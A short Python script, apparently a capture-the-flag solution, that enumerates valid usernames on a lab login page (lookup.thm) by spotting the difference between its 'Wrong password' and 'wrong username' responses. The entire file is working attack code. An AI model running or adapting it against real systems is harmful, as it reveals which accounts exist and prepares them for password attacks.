import requests

# Target URL 
url = "http://lookup.thm/login.php"

# Path to the file containing possible usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

try:
    # Open the username list file
    with open(file_path) as file:
        # Iterate through each line, stripping whitespace
        for username in map(str.strip, file):
            if not username:
                continue  # Skip empty lines

            # Prepare POST request data (username + password)
            data = {"username": username, "password": "password"}

            try:
                # Send the POST request with a timeout
                response = requests.post(url, data=data, timeout=5)
            except requests.RequestException as e:
                # Handle network/HTTP errors gracefully
                print(f"Request error: {e}")
                break

            # Analyze the server response
            if "Wrong password" in response.text:
                # "Wrong password" means the username exists
                print(f"[+] Valid username found: {username}")
            elif "wrong username" in response.text:
                # "Wrong username" means the account does not exist
                continue  # Move on silently

# Handle missing file error
except FileNotFoundError:
    print(f"File not found: {file_path}")
